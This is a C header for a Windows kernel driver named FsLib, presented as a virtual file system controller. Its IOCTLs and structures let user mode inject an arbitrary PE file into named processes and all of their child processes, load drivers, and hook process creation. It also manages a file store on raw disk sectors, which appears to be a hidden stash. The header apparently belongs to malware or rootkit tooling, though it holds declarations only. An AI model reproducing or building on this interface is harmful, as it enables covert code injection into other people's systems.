//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// FsLib project
//	
// module: fslib.h
// $Revision: 80 $
// $Date: 2012-07-11 18:01:22 +0400 (Ср, 11 июл 2012) $
// description: 
//  Virtual file system control driver.

#pragma once

#define		IOCTL_VFS_QUERY_INFO		CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x810, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define		IOCTL_VFS_LOAD_DRIVER		CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x820, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define		IOCTL_VFS_SET_INJECT		CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x830, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define		IOCTL_VFS_SET_CALLBACK		CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x840, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)


typedef	struct	_VFS_INFORMATION
{
	CHAR		FsId[8];			// File system ID (currently "VFAT")
	ULONGLONG	StartSector;		// VFS volume start sector
	ULONG		NumberOfSectors;	// number of sectors in VFS volume
	ULONG		VolumeSize;			// size of the VFS volume in bytes (including FS reserved areas)
	ULONG		BytesTotal;			// effective size of the FS volume (maximum number of bytes can be written)
	ULONG		BytesFree;			// number of free bytes
	WCHAR		DeviceName[];		// name of the system device where VFS allocated
} VFS_INFORMATION, *PVFS_INFORMATION;


#define	VFS_FILE_NAME_LENGTH	12	// bytes
#define	VFS_PROCESS_LIST_LENGTH	256	// bytes

// VFS Inject flags
#define	VFS_INJECT_PROCESS_TREE	0x20	// Inject to all child processes from the process tree created by the specified process

// The following structure is used to set\remove injects by the IOCTL from the user mode
typedef struct _VFS_INJECT_INFO
{
	// Inject flags. Any combination the VFS_INJECT_XXX flags.
	ULONG		InjectFlags;

	// Inject count. Number of inject attemps after which the inject will be removed.
	ULONG		InjectCount;

	// Inject file name in 8.3 DOS format. ANSI, case sensitive.
	// This name will be used to search and remove this inject later.
	CHAR		InjectName[VFS_FILE_NAME_LENGTH];

	// NULL-terminated list of names of target processes delimited by space. ANSI case insensitive.
	// Specifying empty process list removes the inject.
	CHAR		ProcessList[VFS_PROCESS_LIST_LENGTH];

	// PE file to inject
	CHAR		PeFile[];
} VFS_INJECT_INFO, *PVFS_INJECT_INFO;

// The following structure is used to set\remove user create process notification callback
typedef struct _VFS_CALLBACK_INFO
{
	// Callback function linear address
	PVOID	pCallbackFunction;	

	// User-defined context value passed to the callback function
	PVOID	Context;

	// TRUE to set the callback, FALSE to remove
	BOOL	bSet;
} VFS_CALLBACK_INFO, *PVFS_CALLBACK_INFO;

// A pointer to the following structure is being passed to a user create process notification callback routine
typedef struct _USER_CALLBACK_CONTEXT
{
	PVOID	UserContext;
	HANDLE	ProcessId;
	HANDLE	ParentId;
	HANDLE	hEvent;
} USER_CALLBACK_CONTEXT, *PUSER_CALLBACK_CONTEXT;




#ifdef	_NTDDK_		// For kernel-mode driver only

extern UNICODE_STRING	g_FsVolumeDevice;

NTSTATUS	FsLibStartup(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING RegistryPath);
VOID		FsLibCleanup(IN	PDRIVER_OBJECT  DriverObject);
NTSTATUS	FsLibGetFsArea(IN OUT PBK_FS_AREA	pFsArea);
NTSTATUS	FsLibActivate(IN PBK_FS_AREA pFsArea);

NTSTATUS	FsLoadFile(PANSI_STRING	aFileName, PCHAR* pBuffer, PULONG pSize);
NTSTATUS	FsSaveFile(PANSI_STRING	aFileName, PCHAR Buffer, ULONG Size);
NTSTATUS	FsDeleteFile(PANSI_STRING aFileName);

PUNICODE_STRING	AllocUniString(VOID);
VOID FreeUniString(PUNICODE_STRING	pUs);

#endif	// _NTDDK_